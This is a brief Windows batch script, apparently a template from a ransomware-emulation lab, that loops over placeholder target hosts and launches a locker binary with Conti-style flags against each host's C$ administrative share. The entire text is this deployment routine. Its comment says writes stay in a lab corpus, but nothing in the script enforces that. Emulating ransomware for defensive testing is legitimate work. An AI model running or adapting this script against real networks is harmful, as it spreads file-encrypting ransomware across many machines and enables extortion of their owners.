@echo off
rem Conti-style deployment: one locker invocation per target host.
rem The path argument is rendered for fidelity; the simulator confines writes to the lab corpus.
set LOCKER=C:\@@LOCKER_NAME@@
for %%H in (@@TARGETS@@) do (
  "%LOCKER%" -m -net -size 10 -nomutex -p \\%%H\C$
)
